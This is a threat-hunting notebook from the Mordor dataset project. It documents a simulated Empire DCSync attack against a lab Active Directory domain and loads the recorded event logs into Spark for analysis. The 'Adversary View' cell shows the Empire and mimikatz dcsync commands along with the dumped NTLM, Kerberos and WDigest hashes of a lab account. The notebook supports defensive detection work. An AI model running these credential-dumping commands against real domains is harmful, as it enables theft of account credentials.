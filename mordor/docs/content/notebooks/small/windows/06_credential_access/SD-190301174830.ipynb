{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire DCSync"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190301174830 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/03/01 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/credentials/Invoke-DCSync.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_dcsync.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries abusing Active Directory Replication services to retrieve NTLM hashes from domain accounts"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "usemodule credentials/mimikatz/dcsync\n",
    "set domain shire.com\n",
    "set user pgustavo\n",
    "set dc HFDC01.shire.com\n",
    "execute\n",
    "\n",
    "  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo) ** Kitten Edition **\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::dcsync /user:pgustavo /domain:shire.com /dc:HFDC01.shire.com\n",
    "[DC] 'shire.com' will be the domain\n",
    "[DC] 'HFDC01.shire.com' will be the DC server\n",
    "[DC] 'pgustavo' will be the user account\n",
    "\n",
    "Object RDN           : Pedro Gustavo\n",
    "\n",
    "** SAM ACCOUNT **\n",
    "\n",
    "SAM Username         : pgustavo\n",
    "User Principal Name  : pgustavo@shire.com\n",
    "Account Type         : 30000000 ( USER_OBJECT )\n",
    "User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )\n",
    "Account expiration   : \n",
    "Password last change : 1/14/2019 12:20:18 PM\n",
    "Object Security ID   : S-1-5-21-2511471446-1103646877-3980648787-1107\n",
    "Object Relative ID   : 1107\n",
    "\n",
    "Credentials:\n",
    "  Hash NTLM: 8ece039f32592670b45fc801e2a9157d\n",
    "    ntlm- 0: 8ece039f32592670b45fc801e2a9157d\n",
    "    lm  - 0: 15e09e2518ec09060eb8d5e3edca688b\n",
    "\n",
    "Supplemental Credentials:\n",
    "* Primary:NTLM-Strong-NTOWF *\n",
    "    Random Value : 2a41aad084dd4b0f85542de96ec0d713\n",
    "\n",
    "* Primary:Kerberos-Newer-Keys *\n",
    "    Default Salt : SHIRE.COMpgustavo\n",
    "    Default Iterations : 4096\n",
    "    Credentials\n",
    "      aes256_hmac       (4096) : e9090c842bd528e456efc9912d417e0fba163d185cf11e803a75299c112ccf71\n",
    "      aes128_hmac       (4096) : a45b256dcf19e05e7be415c8f8b74df3\n",
    "      des_cbc_md5       (4096) : 40c4aef2ad988352\n",
    "\n",
    "* Primary:Kerberos *\n",
    "    Default Salt : SHIRE.COMpgustavo\n",
    "    Credentials\n",
    "      des_cbc_md5       : 40c4aef2ad988352\n",
    "\n",
    "* Packages *\n",
    "    NTLM-Strong-NTOWF\n",
    "\n",
    "* Primary:WDigest *\n",
    "    01  581eb1df6c6053b76a28a0dce36a8d6f\n",
    "    02  7527b4ed5fdb8d86b3aae51bfa369d09\n",
    "    03  1afb1ea2a11dacbaa9a7de3cdba90d2e\n",
    "    04  581eb1df6c6053b76a28a0dce36a8d6f\n",
    "    05  7527b4ed5fdb8d86b3aae51bfa369d09\n",
    "    06  71ae329e68bc24b2c4aa77275ddbb153\n",
    "    07  581eb1df6c6053b76a28a0dce36a8d6f\n",
    "    08  beb04fe3623809f7bacf7e37109d4d21\n",
    "    09  beb04fe3623809f7bacf7e37109d4d21\n",
    "    10  dcbadc06749ae53ff0a5b12fea3117ca\n",
    "    11  b4fba84ff02a3bf713d6de143ed08a04\n",
    "    12  beb04fe3623809f7bacf7e37109d4d21\n",
    "    13  f70d458543eeb1491b108783723d5250\n",
    "    14  b4fba84ff02a3bf713d6de143ed08a04\n",
    "    15  eb84c71ed69b32bc4def1ad8a50a3fec\n",
    "    16  eb84c71ed69b32bc4def1ad8a50a3fec\n",
    "    17  58e1d74ac34fc6fcc20d947e4bf5e3a9\n",
    "    18  73eb0629757be77aa4a5a9c1a782658a\n",
    "    19  60f5c9eefaacae631e229fd15f70ad92\n",
    "    20  df090cdf058cdbda7bc78a57d2241a9a\n",
    "    21  286470c2e82b1e8316b1a5198b9c72ec\n",
    "    22  286470c2e82b1e8316b1a5198b9c72ec\n",
    "    23  689bbadaae7f867861432adf3e385396\n",
    "    24  91ff8d6376c52d90415254b0444b497b\n",
    "    25  91ff8d6376c52d90415254b0444b497b\n",
    "    26  bc4e42e3164f8e5d01f1b92fc75370ee\n",
    "    27  535147dcae01ac8505ce306cdcbdfb97\n",
    "    28  1aa7a460e6e4b2a1431c819b26626241\n",
    "    29  6348ec8df577d8d1eb401cc5e29ee763\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_dcsync.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
